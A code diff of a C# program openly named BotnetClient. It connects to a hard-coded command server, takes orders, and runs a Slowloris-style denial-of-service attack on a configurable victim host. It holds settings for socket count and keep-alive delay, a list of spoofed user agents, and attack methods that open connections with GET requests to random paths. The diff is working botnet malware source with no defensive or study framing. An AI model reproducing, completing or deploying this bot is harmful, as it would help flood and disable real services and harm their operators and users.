@@ -18,15 +18,21 @@ namespace BotnetClient
 {
     public partial class MainPanel : MetroFramework.Forms.MetroForm
     {
-        // Client Variables
+        // Client Socket
         Socket socket;
+        // Client thread
         Thread clientThread;
-        static string HostOrIP = ""; // Victim's IP or hostname
+        // Host Server Settings
+        string serverIPV4 = "192.168.1.44"; // IPV4 of host server (for lan)
+        Int32 serverPort = 11111; // Server Port
+        // Attack Settings
+        static string HostOrIP = "1.1.1.1"; // Victim's IP or hostname
         static int Port = 80; // Victim's port
         static bool UseSsl = false; // Will we use SSL when attacking?
-        static bool restart = false;
+        static bool restart = false; // If this gets set to true, the client will restart
         static int Delay = 15000; // Delay between keep alive data
         static int SockCount = 8; // How many connections to make?
+        Boolean attacking = false; // Are we currently attacking?
         // Other Variables
         static Random Rand = new Random(); // Random number generator
         static string[] UserAgents = // User agent list
@@ -57,10 +63,7 @@ namespace BotnetClient
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
             "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
         };
-
-        // Action variables
         string previousLogMessage = "";
-        Boolean attacking = true;
 
         /// <summary>
         /// MainPanel Function, this is the constructor for the window
@@ -80,9 +83,9 @@ namespace BotnetClient
         /// </summary>
         public void clientSocketThread()
         {
+            // Variables to manage the status of the server
             Boolean run = true;
             Boolean stayConnected = true;
-            int responceCounter = 1;
             while (run)
             {
                 try
@@ -90,8 +93,18 @@ namespace BotnetClient
                     log("Establishing connection with host server...");
                     // Establish the remote endpoint for the socket. This example uses port 11111 on the local computer. 
                     IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
-                    IPAddress ipAddr = ipHost.AddressList[0];
-                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);
+                    IPAddress ipAddr;
+                    try
+                    {
+                        // Try to set socket IP address to current IPV4 address (only works on wifi as of now)
+                        ipAddr = IPAddress.Parse(serverIPV4);
+                    }
+                    catch (Exception e)
+                    {
+                        // Fail safe = grabbing some other ip address that only works when all clients are on same pc as host
+                        ipAddr = ipHost.AddressList[0];
+                    }
+                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, serverPort);
                     // Creation TCP/IP Socket using Socket Class Costructor 
                     socket = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                     log("Connecting...");
@@ -100,21 +113,20 @@ namespace BotnetClient
                         // Connect Socket to the remote endpoint using method Connect() 
                         socket.Connect(localEndPoint);
                         // We print EndPoint information that we are connected 
-                        log("Socket connected to -> " + socket.RemoteEndPoint.ToString());
+                        log("Socket connected to -> " + ipAddr.ToString() + ":" + serverPort.ToString());
                         while (stayConnected)
                         {
                             // Send reponce message to server
-                            // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE, RE-ENABLE
+                            // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE THIS IS WHERE IT WOULD GO
                             if (false)
                             {
                                 string messageToSend = "[Alive: true], [RunningAttack: true]<EOF>";
                                 byte[] messageSent = Encoding.ASCII.GetBytes(messageToSend);
-                                log("Responce " + responceCounter + ": " + messageToSend);
+                                log("Responce: " + messageToSend);
                                 int byteSent = socket.Send(messageSent);
-                                responceCounter++;
                             }
 
-                            // Recieve message from server
+                            // Recieve updates from host server
                             try
                             {
                                 // Data buffer 
@@ -309,7 +321,7 @@ namespace BotnetClient
 
 
 
-        // Attack Methods (these need work/tweaking)
+        // Attack Methods (these need work/tweaking) (tbh im not sure how affective these even are, we might need to re-write this entirely. But in theory they should work)
         public void InitClient(TcpClient c)
         {
             byte[] GET = Encoding.UTF8.GetBytes($"GET /?{Rand.Next(2000)} HTTP/1.1\r\n"); // GET request to random nonexistent location
